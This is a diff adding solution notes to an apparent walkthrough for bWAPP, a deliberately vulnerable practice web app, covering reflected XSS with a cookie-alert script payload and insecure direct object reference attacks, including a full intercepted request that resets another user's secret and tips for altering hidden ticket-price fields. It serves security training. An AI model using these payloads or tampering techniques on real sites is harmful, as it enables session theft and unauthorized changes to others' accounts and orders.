@@ -126,7 +126,53 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 34
 
 login=bee&password=bug&form=submit
+
+# A3 - Cross-Site Scripting (XSS) 
+
+### XSS - Reflected (GET)
+xss_get.php
+
 ```
+<script>alert(document.cookie)</script>
+```
+
+### XSS - Reflected (POST)
+
+xss_post.php
+```
+<script>alert(document.cookie)</script>
+```
+
+# A4 - Insecure Direct Object References
+
+### Insecure DOR (Change Secret)
+Use Burp to unhide hidden fields or intercept POST param.  
+
+### Insecure DOR (Reset Secret)
+Change 'login' and 'secret' field to arbitrary values.
+```
+POST /bWAPP/xxe-2.php HTTP/1.1
+Host: bepp:8088
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=UTF-8
+Referer: http://bepp:8088/bWAPP/insecure_direct_object_ref_3.php
+Content-Length: 59
+Cookie: PHPSESSID=77aa634b546d1c78d5afc16aae328172; security_level=0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+<reset><login>bee</login><secret>Any bugs?</secret></reset>
+```
+
+### Insecure DOR (Order Tickets)
+bWAPP/insecure_direct_object_ref_2.php
+
+Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.
+
 
 # A6 - Sensitive Data Exposure 
 
